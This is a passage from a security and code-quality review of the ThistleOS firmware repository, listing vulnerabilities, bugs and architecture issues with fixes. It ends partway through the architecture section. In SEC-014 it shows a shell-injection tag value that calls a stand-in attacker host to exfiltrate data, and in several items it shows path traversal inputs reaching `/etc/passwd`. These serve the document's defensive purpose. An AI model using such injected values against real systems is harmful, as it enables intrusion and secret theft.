# FABLE Improvements — ThistleOS Comprehensive Review

This document captures the findings of a full-repository review covering security vulnerabilities, code-quality bugs, architectural issues, UI/UX problems, build/CI weaknesses, and documentation gaps. Each item is structured as **ID, Type, Issue, Fix** and includes severity and file references where applicable.

> **Scope:** `wan0net/thistle-os` @ `2d7f9fb`  
> **Branch reviewed:** `wan0net-comprehensive-repo-review`  
> **Date:** 2026-07-11

---

## Summary

| Category | Critical | High | Medium | Low | Total |
|---|---:|---:|---:|---:|---:|
| Security | 4 | 13 | 8 | 0 | 25 |
| Bugs / Code Quality | 8 | 10 | 14 | 0 | 32 |
| Architecture / Implementation | 0 | 5 | 9 | 4 | 18 |
| UI / UX / Usability | 0 | 1 | 18 | 16 | 35 |
| Build / CI / Tooling | 0 | 2 | 6 | 2 | 10 |
| Documentation | 0 | 1 | 8 | 4 | 13 |
| **Total** | **12** | **32** | **63** | **26** | **133** |

---

## How to Read This Document

- **ID** — Unique identifier for tracking (e.g., `SEC-001`, `BUG-001`, `ARCH-001`, `UX-001`).
- **Type** — Category of issue (e.g., `AuthenticationFailure`, `BufferOverflow`, `ArchitectureViolation`, `Usability`).
- **Severity** — `CRITICAL`, `HIGH`, `MEDIUM`, or `LOW`.
- **Files** — Primary file(s) and line numbers where the issue occurs.
- **Issue** — Description of the problem and its impact.
- **Fix** — Recommended remediation.

---

## 1. Security

### SEC-001 — Kernel OTA from SD accepts missing or malformed signatures
- **Type:** AuthenticationFailure / SignatureBypass
- **Severity:** CRITICAL
- **Files:** `components/kernel_rs/src/ota.rs:146-154`
- **Issue:** `ota_apply_from_sd` only rejects updates when `signing_verify_file` returns `ESP_ERR_INVALID_CRC`. A missing `.sig` file (`ESP_ERR_NOT_FOUND`) or a signature of the wrong size (`ESP_ERR_INVALID_SIZE`) falls through and the update is applied. An attacker with physical SD access can flash an unsigned firmware.
- **Fix:** Reject any result other than `ESP_OK`; treat `NOT_FOUND`/`INVALID_SIZE` as hard failures in production.

### SEC-002 — App-store client skips signature verification when `sig_url` is empty
- **Type:** AuthenticationFailure / SignatureBypass
- **Severity:** CRITICAL
- **Files:** `components/kernel_rs/src/appstore_client.rs:956-981`
- **Issue:** `appstore_install_entry` only verifies the downloaded ELF when `sig_url` is non-empty. If a catalog entry omits the signature URL, the kernel installs and runs arbitrary code without cryptographic verification.
- **Fix:** Make signature verification mandatory; fail closed if `sig_url` is missing or the signature cannot be fetched/verified.

### SEC-003 — Recovery captive-portal mutating endpoints are unauthenticated
- **Type:** AuthenticationFailure / BrokenAccessControl
- **Severity:** CRITICAL
- **Files:** `recovery/src/recovery_web.rs:785-1006`
- **Issue:** `POST /api/wifi/connect`, `/api/board/select`, `/api/bundle/download`, and `/api/reboot` have no authentication or session binding. Any client connected to the open recovery AP can change Wi-Fi credentials, select a board, download/install firmware, or reboot the device.
- **Fix:** Require a one-time setup password or token before exposing mutating endpoints; validate the token on every state-changing request.

### SEC-004 — Recovery HTTPS downloads do not validate server certificates
- **Type:** AuthenticationFailure / BadCrypto
- **Severity:** CRITICAL
- **Files:** `recovery/src/recovery_ota.rs:1401-1404`
- **Issue:** `http_get_bytes` creates an `EspHttpConnection` with `HttpConfig { timeout: ..., ..Default::default() }`. The default config does not attach a CA bundle, so TLS certificate verification is disabled for catalog/firmware downloads. A network attacker can intercept HTTPS traffic and serve malicious firmware.
- **Fix:** Configure `crt_bundle_attach` (or equivalent CA validation) on every HTTPS connection.

### SEC-005 — App-store HTTPS client does not validate server certificates
- **Type:** AuthenticationFailure / BadCrypto
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/appstore_client.rs:66-83`, `797`
- **Issue:** The custom `EspHttpClientConfig` struct only sets `url`, `event_handler`, `user_data`, and `timeout_ms`; it never sets `crt_bundle_attach`. Consequently, `https://` catalog and download requests are vulnerable to MITM.
- **Fix:** Add `crt_bundle_attach` to `EspHttpClientConfig` and initialize it with the ESP-IDF certificate bundle.

### SEC-006 — App identity and permissions are derived from an unsigned manifest
- **Type:** BrokenAccessControl / DataIntegrity
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/elf_loader.rs:341-384`
- **Issue:** The ELF loader parses `.manifest.json` before signature verification and uses the manifest's `id` field as `perm_id`. The manifest itself is not signed, so an attacker can pair a legitimate signed ELF with a forged manifest that claims a privileged app ID (e.g., `system`) and receive `PERM_ALL`.
- **Fix:** Sign manifests and verify the signature before reading identity/permission fields, or derive the app identity only from the signed ELF.

### SEC-007 — HAL driver-registration syscalls require no permissions
- **Type:** BrokenAccessControl
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/syscall_table.rs:539-552`
- **Issue:** `hal_audio_register`, `hal_display_register`, `hal_gps_register`, `hal_imu_register`, `hal_input_register`, `hal_power_register`, `hal_radio_register`, `hal_storage_register`, and the bus registration syscalls are registered with the default permission of `0`. Any loaded app can overwrite global HAL vtables and intercept or spoof hardware access.
- **Fix:** Require a privileged capability (e.g., `PERM_DRIVER` or `PERM_HAL`) for every `hal_*_register` syscall.

### SEC-008 — `thistle_fs_open` syscall has no path sandboxing
- **Type:** BrokenAccessControl / PathTraversal
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/syscall_table.rs:453-458`, `575`
- **Issue:** `thistle_fs_open_impl` only validates that the pointer lies inside the app's memory region, then passes the raw path to `fopen`. An app with `PERM_STORAGE` can open any absolute path on the filesystem (e.g., `/sd/system.json`, other apps' data).
- **Fix:** Enforce a per-app chroot/sandbox prefix and reject paths containing `..` or leading `/` outside the granted storage root.

### SEC-009 — TOCTOU between signature verification and load/flash
- **Type:** DataIntegrity / TOCTOU
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/driver_loader.rs:373-424`, `components/kernel_rs/src/ota.rs:146-157`
- **Issue:** Both the driver loader and the SD OTA path verify a signature and then re-read the file from storage before use. An attacker who can modify the SD card or filesystem between verify and read can replace the verified bytes with malicious ones.
- **Fix:** Verify the signature over the same in-memory buffer that is later loaded/flashed; do not re-read from disk after verification.

### SEC-010 — Recovery catalog `id` allows path traversal
- **Type:** BrokenAccessControl / PathTraversal
- **Severity:** HIGH
- **Files:** `recovery/src/recovery_ota.rs:1242-1251`
- **Issue:** Catalog `id` values are interpolated into destination paths such as `{SD_DRIVERS_DIR}/{id}.drv.elf` without sanitization. A catalog entry with `id = "../../../etc/mal"` can write outside the intended directories.
- **Fix:** Validate that `id` matches a strict alphanumeric/safe-character pattern and reject `..`, `/`, and null bytes.

### SEC-011 — App-store catalog `id` allows path traversal
- **Type:** BrokenAccessControl / PathTraversal
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/appstore_client.rs:931-939`, `782`
- **Issue:** The app-store client builds local paths from catalog `id` strings and writes downloaded files there. An attacker-controlled catalog can use `../` in `id` to overwrite files outside the app-store directory.
- **Fix:** Sanitize `id` (allow only `[A-Za-z0-9_-]`) and resolve the final path within the intended directory before writing.

### SEC-012 — Assistant app sends API key to attacker-controlled URL
- **Type:** SSRF / SensitiveDataLeak
- **Severity:** HIGH
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:342-343`, `440-455`
- **Issue:** `api_url` is read from an SD-card JSON config with no allowlist or validation, then used as the HTTP client URL. The same config's `api_key` is sent in the `x-api-key` header. An attacker who can modify the SD card can redirect requests to their own server and exfiltrate the API key.
- **Fix:** Hardcode or allowlist permitted API endpoints; do not let an SD-card config override the URL that receives secrets.

### SEC-013 — Modem SMS function is vulnerable to AT command injection
- **Type:** StringInjection / CommandInjection
- **Severity:** HIGH
- **Files:** `components/drv_modem_a7682e/src/drv_modem_a7682e.c:552-588`
- **Issue:** `drv_a7682e_send_sms` builds `AT+CMGS="%s"\r%s\x1A` directly from the `phone` and `msg` arguments. A caller that embeds `\x1A`, `\r`, `"`, or other AT metacharacters can prematurely terminate the SMS body and inject additional modem commands.
- **Fix:** Use the modem API's structured SMS send if available, or strictly validate/sanitize the phone number and message body before formatting.

### SEC-014 — CI release workflow is vulnerable to expression injection
- **Type:** StringInjection / CommandInjection
- **Severity:** HIGH
- **Files:** `.github/workflows/release.yml:29`, `35`
- **Issue:** `${{ inputs.tag }}` and `${{ inputs.run_id }}` are interpolated directly into shell `run` blocks. A user-supplied tag like `$(curl attacker.com/exfil)` or a run_id containing shell metacharacters will execute in the workflow runner.
- **Fix:** Assign inputs to environment variables and reference the variables in the shell scripts; GitHub Actions will not expand `${{ }}` inside shell strings when passed through env.

### SEC-015 — App-signing workflow exposes the signing key in process arguments
- **Type:** SensitiveDataLeak
- **Severity:** HIGH
- **Files:** `.github/workflows/apps.yml:79`
- **Issue:** The `SIGNING_KEY` secret is passed to `sign_elf.py` as `--key "$SIGNING_KEY"` on the command line. The key is visible in `/proc/*/cmdline` to any process on the runner and may be captured by logs or telemetry.
- **Fix:** Write the signing key to a temporary file (or use an environment variable) and pass the file path; never place secrets on a command line.

### SEC-016 — Recovery Wi-Fi access point is open by default
- **Type:** SecurityMisconfiguration / AuthenticationFailure
- **Severity:** HIGH
- **Files:** `recovery/src/main.rs:131-136`
- **Issue:** The recovery AP is configured with `auth_method: AuthMethod::None`. Anyone in range can connect and reach the captive portal, enabling all unauthenticated mutating endpoints.
- **Fix:** Generate a random WPA2 passphrase per boot (or derive one from device identity) and display it on screen; alternatively, require physical button press to enable the AP.

### SEC-017 — Input-callback registration requires no permission
- **Type:** BrokenAccessControl / SensitiveDataLeak
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/syscall_table.rs:364-376`, `580`
- **Issue:** `thistle_input_register_cb` is registered without a permission check. Any app can register a callback on every input device and capture keystrokes, touch events, and other user input.
- **Fix:** Require `PERM_INPUT` (or equivalent) and restrict callbacks to the registering app's context.

### SEC-018 — IPC sender identity is attacker-controlled
- **Type:** AuthenticationFailure / BrokenAccessControl
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/ipc.rs:31-38`, `119-141`
- **Issue:** `CIpcMessage.src_app` is set by the caller and is never validated by the kernel before dispatch or enqueue. A malicious app can spoof messages as another app ID, tricking recipients into trusting forged IPC traffic.
- **Fix:** The kernel should overwrite `src_app` with the actual sender's app ID before dispatching.

### SEC-019 — Data race on signing public-key hex buffer
- **Type:** MemorySafety / RaceCondition
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/signing.rs:35`, `85`, `201-204`
- **Issue:** `static mut HEX_BUF` is written under `VERIFYING_KEY.lock()` in `signing_init`, but `signing_get_public_key_hex` returns a pointer to it without any synchronization. A concurrent call during initialization can read a partially updated buffer.
- **Fix:** Use a `RwLock` or atomic `Once` to ensure the buffer is fully initialized before any reader accesses it.

### SEC-020 — Messenger and vault use PBKDF2 with only 10,000 iterations
- **Type:** BadCrypto
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/msg_crypto.rs:45`, `apps/vault/vault/vault_ui.c:62`
- **Issue:** Both the messenger crypto channel and the vault derive keys with PBKDF2-SHA256 and only 10,000 iterations. This is below modern recommendations (OWASP recommends 600,000+ for PBKDF2-SHA256), making offline passphrase cracking feasible.
- **Fix:** Increase iterations to at least 600,000, or migrate to Argon2id/bcrypt/scrypt.

### SEC-021 — Assistant app constructs JSON from unsanitized config fields
- **Type:** StringInjection / PromptInjection
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:394-396`
- **Issue:** `cfg->model` and `cfg->system_prompt` are inserted into the JSON request body via `snprintf` without escaping quotes, backslashes, or control characters. A malicious SD-card config can break out of the JSON string and alter the request structure or system prompt.
- **Fix:** Use a JSON encoder to build the request body, or sanitize/escape both fields before interpolation.

### SEC-022 — `build_catalog.py` reads manifest `entry` path before traversal check
- **Type:** BrokenAccessControl / PathTraversal
- **Severity:** MEDIUM
- **Files:** `tools/build_catalog.py:29-48`
- **Issue:** The script reads `elf_path.read_bytes()` before verifying that `elf_path` is inside `artifact_path`. A manifest with `entry = "../../../etc/passwd"` causes the tool to read arbitrary files.
- **Fix:** Resolve and validate `elf_path` under `artifact_path` before reading the file.

### SEC-023 — LVGL dependency is cloned by mutable tag
- **Type:** SupplyChainAttack
- **Severity:** MEDIUM
- **Files:** `.github/workflows/pages.yml:72`, `.github/workflows/tests.yml:91`, `142`
- **Issue:** CI clones `https://github.com/lvgl/lvgl.git` with `--branch v9.2.2`. Tags can be force-moved or deleted, so a future build may pull different code without warning.
- **Fix:** Pin to an immutable commit SHA and verify it (or use a vendored/submodule reference with SHA).

### SEC-024 — Recovery OTA has no rollback/downgrade protection
- **Type:** DataIntegrity
- **Severity:** MEDIUM
- **Files:** `recovery/src/recovery_ota.rs:201-254`
- **Issue:** `flash_to_ota1` writes the provided firmware and sets the boot partition without checking the firmware version, timestamp, or anti-rollback counter. An attacker can flash an older, vulnerable firmware image.
- **Fix:** Enforce monotonic version/rollback counters and verify them before calling `esp_ota_set_boot_partition`.

### SEC-025 — Kernel SD OTA has no rollback/downgrade protection
- **Type:** DataIntegrity
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/ota.rs:146-180`
- **Issue:** `ota_apply_from_sd` verifies (when signatures are present) and flashes the update without comparing the new image's version to the currently running version. A signed but older image can be used to downgrade the device.
- **Fix:** Read the running app version and the update version from image headers/secure storage and reject downgrades.

---

## 2. Bugs / Code Quality

### BUG-001 — Buffer Overflow: `CManifest` undersized allocation in ELF loader
- **Type:** BufferOverflow / MemoryCorruption
- **Severity:** CRITICAL
- **Files:** `components/kernel_rs/src/elf_loader.rs:347`, `450`
- **Issue:** The code allocates 512 bytes for a manifest buffer, but `CManifest` is ~716 bytes (`#[repr(C)]` sum of fields plus alignment). `manifest_parse_file()` writes the full structure, overflowing the heap allocation by ~200 bytes.
- **Fix:** Allocate `std::mem::size_of::<CManifest>()` bytes instead of a hardcoded 512.

### BUG-002 — Buffer Overflow: `CManifest` undersized allocation in driver loader
- **Type:** BufferOverflow / MemoryCorruption
- **Severity:** CRITICAL
- **Files:** `components/kernel_rs/src/driver_loader.rs:404`
- **Issue:** Same as BUG-001: a 512-byte buffer is used for a ~716-byte `CManifest`.
- **Fix:** Use `std::mem::size_of::<CManifest>()` for the allocation.

### BUG-003 — 64-bit pointer truncation in widget handles
- **Type:** TypeSafety / PointerTruncation
- **Severity:** CRITICAL
- **Files:** `components/ui/src/lvgl_wm.c:23-24`
- **Issue:** Widget handles are cast to/from `uint32_t`. On 64-bit targets (including ESP32-S3 and the host simulator), this drops the upper 32 bits of `lv_obj_t*` pointers, corrupting every handle round-trip.
- **Fix:** Use `uintptr_t` for handles throughout the API.

### BUG-004 — Silent file write failure in board config save
- **Type:** MissingErrorHandling / DataLoss
- **Severity:** CRITICAL
- **Files:** `components/kernel/src/board_fallback.c:255-258`
- **Issue:** `fputs()` return value is ignored. If the write fails (e.g., full filesystem), the function still returns `ESP_OK`, causing the board configuration to be silently lost.
- **Fix:** Check the return value and propagate failure; close the file only after confirming the write succeeded.

### BUG-005 — Null pointer dereference in Arduino Wire shim
- **Type:** NullPointerDereference
- **Severity:** CRITICAL
- **Files:** `components/shim/src/arduino_shim.c:462-469`
- **Issue:** `wire_writeBytes()` dereferences `data` without checking for NULL. A caller passing `NULL` with non-zero `len` crashes immediately.
- **Fix:** Add a guard at the top: `if (!data || len == 0) return 0;`.

### BUG-006 — Division by zero in `map()`
- **Type:** Arithmetic / DivisionByZero
- **Severity:** CRITICAL
- **Files:** `components/shim/src/arduino_shim.c:520-523`
- **Issue:** `map()` divides by `(in_max - in_min)` without checking for zero. When `in_max == in_min`, the system crashes.
- **Fix:** Guard the divisor: `if (in_max == in_min) return out_min;`.

### BUG-007 — Null event group dereference in recovery WiFi
- **Type:** NullPointerDereference
- **Severity:** CRITICAL
- **Files:** `recovery/components/recovery_wifi/recovery_wifi.c:126`, `146-150`
- **Issue:** `xEventGroupCreate()` can return NULL when heap is exhausted, but the result is used unchecked in `xEventGroupWaitBits()`.
- **Fix:** Check the handle before use and return `ESP_ERR_NO_MEM` if allocation failed.

### BUG-008 — Format string vulnerabilities in standalone keyboard driver
- **Type:** FormatStringBug / Crash
- **Severity:** CRITICAL
- **Files:** `standalone_drivers/kbd_tca8418/main.c:165`, `175`
- **Issue:** `thistle_log()` is called with format specifiers but no corresponding arguments, causing undefined behavior (reads arbitrary stack values or crashes).
- **Fix:** Pass the missing arguments to each `thistle_log()` call.

### BUG-009 — Unchecked PPP mode restoration in modem SMS functions
- **Type:** ErrorHandling / StateCorruption
- **Severity:** HIGH
- **Files:** `components/drv_modem_a7682e/src/drv_modem_a7682e.c:547`, `597`, `686`
- **Issue:** Three SMS functions temporarily switch the modem to command mode and attempt to restore PPP data mode, but the return value of `esp_modem_set_mode()` is ignored. If restoration fails, the modem stays in command mode while the caller believes data mode is active.
- **Fix:** Capture and propagate the restoration error; do not return success if the modem could not be restored to data mode.

### BUG-010 — Unchecked `psa_import_key()` return value
- **Type:** MissingErrorHandling / CryptographicVulnerability
- **Severity:** HIGH
- **Files:** `components/drv_crypto_mbedtls/src/drv_crypto_mbedtls.c:18-30`
- **Issue:** `psa_import_key()` returns a status code that is ignored. If key import fails, the function may return an uninitialized or invalid key ID.
- **Fix:** Check the status and return `PSA_KEY_ID_NULL` on failure.

### BUG-011 — Null timer dereference in toast
- **Type:** NullPointerDereference
- **Severity:** HIGH
- **Files:** `components/ui/src/toast.c:95-96`
- **Issue:** `lv_timer_create()` can return NULL on allocation failure, but `lv_timer_set_repeat_count()` is called without checking.
- **Fix:** Check the timer handle before use and return an error if allocation failed.

### BUG-012 — Missing null termination after `strncpy`
- **Type:** StringHandling / BufferSafety
- **Severity:** HIGH
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:175-177`
- **Issue:** Three `strncpy()` calls do not null-terminate the destination when the source is exactly the buffer size.
- **Fix:** Explicitly null-terminate each field after copying.

### BUG-013 — Null timer dereference in settings UI
- **Type:** NullPointerDereference
- **Severity:** HIGH
- **Files:** `components/apps_builtin/settings/settings_ui.c:1596-1597`, `1666-1667`
- **Issue:** `lv_timer_create()` results for `s_gps_timer` and `s_power_timer` are used without NULL checks.
- **Fix:** Check each timer before calling `lv_timer_ready()`.

### BUG-014 — Out-of-bounds read in JSON int helper
- **Type:** OutOfBoundsRead
- **Severity:** HIGH
- **Files:** `components/kernel/src/board_builtin_drivers.c:28-45`
- **Issue:** `json_int()` advances through the JSON string without explicit bounds checking, relying solely on null termination. A malformed/non-null-terminated input can read past the buffer.
- **Fix:** Track `json_end = json + strlen(json)` and ensure `p < json_end` before dereferencing.

### BUG-015 — Stack buffer overflow in JSON pattern builder
- **Type:** BufferOverflow
- **Severity:** HIGH
- **Files:** `components/kernel/src/board_builtin_drivers.c:31-32`
- **Issue:** An 80-byte `pattern` buffer is formatted as `"\"%s\""`. A `key` longer than 77 characters overflows the stack buffer.
- **Fix:** Validate `strlen(key)` or use a dynamically sized buffer.

### BUG-016 — Use-after-free race in simulator `esp_timer`
- **Type:** RaceCondition / UseAfterFree
- **Severity:** HIGH
- **Files:** `simulator/platform/platform_stubs.c:40-93`
- **Issue:** `esp_timer_delete()` sets `active = false`, sleeps 1 ms, then frees the timer struct. The detached timer thread may still be running and accessing the struct after it is freed.
- **Fix:** Use a joinable thread or a reference-counted lifetime mechanism; do not free until the timer thread has exited.

### BUG-017 — Memory leak on simulator display init failure
- **Type:** ResourceLeak
- **Severity:** HIGH
- **Files:** `simulator/drivers/sim_display.c:52-126`
- **Issue:** Framebuffers `s_fb` and `s_fb32` are allocated but are not freed when any subsequent SDL initialization step fails.
- **Fix:** Free both framebuffers on every error return path before returning.

### BUG-018 — Path traversal in ELF signing tool
- **Type:** PathTraversal / InformationDisclosure
- **Severity:** HIGH
- **Files:** `tools/sign_elf.py:73-75`
- **Issue:** The `--key` argument accepts `@path` to read a key from a file, but the path is not validated. An attacker can read arbitrary files (e.g., `@../../../etc/passwd`).
- **Fix:** Resolve the path and ensure it is within an allowed key directory, or reject `@` paths entirely and require the key via environment variable.

### BUG-019 — Race condition in driver slot allocation
- **Type:** RaceCondition / TOCTOU
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/driver_loader.rs:343`, `453`, `460`
- **Issue:** `count` is read while holding the lock, the lock is released during loading, then `slot_idx` is read again. Another thread can allocate a slot in between, causing two drivers to use the same slot.
- **Fix:** Hold the lock for the entire slot allocation and initialization sequence, or use the original `count` value consistently.

### BUG-020 — Missing wildcard handler dispatch in IPC
- **Type:** LogicError
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/ipc.rs:55`, `129`, `289`
- **Issue:** The comment and struct state that `msg_type == u32::MAX` matches all types, but the dispatch filter only checks exact equality.
- **Fix:** Include wildcard handlers in the filter: `e.active && (e.msg_type == msg.msg_type || e.msg_type == u32::MAX)`.

### BUG-021 — Mutex poison panic risk in IPC
- **Type:** Robustness / PanicPath
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/ipc.rs:107`, `121`, `149`, `184`
- **Issue:** Multiple `.lock().unwrap()` calls on the IPC mutex will panic if the mutex is poisoned. In a kernel context, this crashes the system.
- **Fix:** Handle poisoned locks gracefully by returning `ESP_ERR_INVALID_STATE` instead of unwrapping.

### BUG-022 — Unchecked `fread` in theme loading
- **Type:** IOErrorHandling
- **Severity:** MEDIUM
- **Files:** `components/ui/src/theme.c:179-181`
- **Issue:** `fread()` return value is ignored. A partial or failed read results in parsing uninitialized/garbage JSON.
- **Fix:** Verify `fread()` returns `size` bytes before parsing.

### BUG-023 — Unchecked `fread` in assistant config load
- **Type:** IOErrorHandling
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:338-340`
- **Issue:** `fread()` result is used to null-terminate the buffer, but a read failure is not detected.
- **Fix:** Return `false` if `n == 0` or `ferror(f)` is set.

### BUG-024 — Ignored `lv_timer_create` return value in launcher
- **Type:** ErrorHandling
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/launcher/launcher_ui.c:404`
- **Issue:** The clock timer creation result is discarded; if it fails, the launcher clock never updates silently.
- **Fix:** Check the return value and log a warning on failure.

### BUG-025 — `snprintf` error handling bug in assistant request builder
- **Type:** BufferManagement
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:392-432`
- **Issue:** `pos` is an `int`. If `snprintf()` returns -1 on error, `pos` becomes negative, and the next `sizeof(body) - pos` calculation wraps to a huge value, defeating the buffer size limit.
- **Fix:** Use `size_t pos` and validate each `snprintf` return before adding.

### BUG-026 — Null LVGL object creation in widget API
- **Type:** NullPointerDereference
- **Severity:** MEDIUM
- **Files:** `components/ui/src/lvgl_wm.c:36`, `47`, `55`, `57`, `67`
- **Issue:** `lv_obj_create()`, `lv_label_create()`, `lv_button_create()`, and `lv_textarea_create()` can return NULL on allocation failure, but the results are dereferenced without checks.
- **Fix:** Add NULL checks after each creation and return 0 (or an error) on failure.

### BUG-027 — Ignored board config backup errors in recovery
- **Type:** MissingErrorHandling
- **Severity:** MEDIUM
- **Files:** `recovery/src/recovery_ota.rs:1303-1304`
- **Issue:** `create_dir_all()` and `copy()` errors are silently discarded with `let _ = ...`. A missing board config backup is not reported.
- **Fix:** Log warnings or propagate the errors.

### BUG-028 — Missing firmware size validation in bundle download
- **Type:** InconsistentValidation / LogicError
- **Severity:** MEDIUM
- **Files:** `recovery/src/recovery_ota.rs:1261-1267`
- **Issue:** The SD-card firmware path validates size against `MAX_FIRMWARE_SIZE`, but the catalog bundle download path flashes the data without the same check.
- **Fix:** Add the same size validation before calling `flash_to_ota1(&data)`.

### BUG-029 — Memory leak in simulator `xTaskCreate`
- **Type:** ResourceLeak
- **Severity:** MEDIUM
- **Files:** `simulator/platform/platform_stubs.c:112-145`
- **Issue:** The `sim_task_t` wrapper structure is never freed when a task function returns.
- **Fix:** Free the `sim_task_t` in `task_wrapper()` after the task function returns.

### BUG-030 — Missing `xQueueDelete` implementation
- **Type:** ResourceLeak
- **Severity:** MEDIUM
- **Files:** `simulator/platform/platform_stubs.c:173-185`
- **Issue:** `xQueueGenericCreate()` allocates buffer, mutex, and condition variables, but there is no corresponding delete function in the simulator stubs.
- **Fix:** Implement `vQueueDelete()` / `xQueueDelete()` to free the queue resources.

### BUG-031 — Incorrect I2C device handle in standalone keyboard driver
- **Type:** APIMisuse
- **Severity:** MEDIUM
- **Files:** `standalone_drivers/kbd_tca8418/main.c:184-188`
- **Issue:** The driver stores the raw I2C bus handle as the device handle instead of calling `i2c_master_bus_add_device()`. This bypasses the ESP-IDF I2C device API contract and can cause bus conflicts.
- **Fix:** Create a proper device handle with `i2c_master_bus_add_device()` before storing it.

### BUG-032 — Missing partition key validation in size checker
- **Type:** MissingErrorHandling
- **Severity:** MEDIUM
- **Files:** `tools/check_partition_sizes.py:52`, `54`
- **Issue:** The script directly accesses `sizes["ota_1"]` and `sizes["ota_0"]` without checking whether those keys exist, causing a `KeyError` on malformed partition tables.
- **Fix:** Validate key presence before access and emit a clear error message.

---

## 3. Architecture / Implementation

### ARCH-001 — Kernel violates hardware independence with direct ESP-IDF calls
- **Type:** ArchitectureViolation
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/appstore_client.rs:1-100`, `components/kernel_rs/src/wifi_manager.rs`
- **Issue:** The kernel's core axiom is 100% hardware independence, yet `appstore_client.rs` directly calls `esp_http_client_init()`, `esp_http_client_perform()`, etc. (74 instances). These are not HAL-abstracted network operations, coupling the kernel to ESP-IDF and making it non-portable.
- **Fix:** Create `hal_network_driver_t` vtable for HTTP operations; move all `esp_http_client_*` calls to a standalone HTTP driver loaded at boot.

### ARCH-002 — Global mutable state with `UnsafeCell` creates race condition risk
- **Type:** Architecture / ConcurrencyIssue
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/hal_registry.rs:434-460`
- **Issue:** `GlobalRegistry` uses `UnsafeCell<HalRegistry>` with a manual `unsafe impl Sync`. The safety comment claims single-threaded mutation during board init, but driver registration calls from ELF drivers at runtime and the display server both invoke `registry_mut()` without locking under FreeRTOS multitasking.
- **Fix:** Replace `UnsafeCell` with `Mutex<HalRegistry>` for runtime access; keep a fast read-only view for frequently-accessed HAL pointers.

### ARCH-003 — Weak linker stub symbol resolution creates unintended overrides
- **Type:** Linker / BuildSystemIssue
- **Severity:** HIGH
- **Files:** `components/kernel/src/tk_wm_shims.c:1-60`, `components/kernel/src/kernel_shims.c:57-99`
- **Issue:** The weak stub pattern fails when the Rust static library is extracted first, satisfying the linker, and the strong C implementation is processed but the symbol is already resolved. The comment explicitly warns that this causes every `thistle_ui_create_*` call to return 0 and no widgets to be created.
- **Fix:** Eliminate weak stubs entirely; use CMake to enforce `ui` component links before `kernel_rs` extraction, or use strong symbols with namespace separation. Add linker validation tests to CI.

### ARCH-004 — Driver reload lifecycle incomplete
- **Type:** IncompleteFeature
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/driver_reload.rs`, `components/kernel/src/kernel_shims.c:75-98`
- **Issue:** Driver hot-reload is claimed to be working but is stubbed. Unload hooks return `ESP_ERR_NOT_SUPPORTED`, stale HAL pointers remain after unload, and there is no reference counting or safety mechanism. Memory leaks from unloaded PSRAM allocations are likely.
- **Fix:** Implement real ESP-IDF unload lifecycle; add reference counting to HAL drivers; clear stale pointers after unload; add integration tests; mark feature as partial in docs until complete.

### ARCH-005 — Runtime window manager loading not implemented
- **Type:** IncompleteArchitecture
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/display_server.rs:80`
- **Issue:** `display_server_load_wm` is a stub returning `ESP_ERR_NOT_SUPPORTED // TODO: runtime WM loading`. Users cannot swap WMs at runtime or install new ones, despite the architecture claiming swappable window managers.
- **Fix:** Implement ELF loading for `.wm.elf` files (parallel to app/driver loading); support `.wm.elf` manifest parsing; safe vtable unloading and registration of new WM; add test coverage for WM hot-swap.

### ARCH-006 — Excessive unsafe code without safety boundaries
- **Type:** Safety / Maintainability
- **Severity:** HIGH
- **Files:** Throughout `components/kernel_rs/src/`
- **Issue:** 1,590 total `unsafe` / `unsafe impl` / `unsafe fn` occurrences and 714 `unwrap()` / `expect()` calls with no centralized safety documentation. Examples include `CStr::from_ptr(...).to_str().unwrap_or("")` and `guard.as_mut().unwrap()` in critical paths.
- **Fix:** Replace `.unwrap()` with `.unwrap_or_default()` or proper `Result` propagation; add safety invariant documentation for each unsafe block; implement a panic hook for graceful shutdown; add fuzz testing for manifest parsing and ELF loading.

### ARCH-007 — Monolithic modules violate single responsibility principle
- **Type:** Maintainability / Design
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/contact_manager.rs` (2,278 lines), `appstore_client.rs` (2,069 lines), `msg_queue.rs` (1,732 lines), `ble_scanner.rs` (1,676 lines), `driver_reload.rs` (1,557 lines)
- **Issue:** Each module combines multiple responsibilities without clear boundaries, making testing and review difficult.
- **Fix:** Split `appstore_client.rs` into `appstore_http.rs`, `appstore_manifest.rs`, `appstore_install.rs`, and `appstore.rs`. Similarly modularize `contact_manager`, `msg_queue`, `driver_reload`.

### ARCH-008 — No error recovery in critical paths
- **Type:** Reliability / ErrorHandling
- **Severity:** HIGH
- **Files:** `components/kernel_rs/src/display_server.rs`, `app_manager.rs`, `driver_loader.rs`
- **Issue:** Critical error paths return generic error codes without context or recovery attempts. Examples include `display_server_load_wm` returning `ESP_ERR_NOT_SUPPORTED` and `app_manager::init` returning `ESP_OK` when already initialized.
- **Fix:** Add comprehensive error logging; implement fallback strategies (default WM, continue with remaining drivers, user-facing errors); add error codes with detailed documentation.

### ARCH-009 — HAL interfaces incomplete and drivers compiled into kernel
- **Type:** ArchitectureGap
- **Severity:** MEDIUM
- **Files:** `components/thistle_hal/include/hal/`, `components/kernel_rs/src/lib.rs`
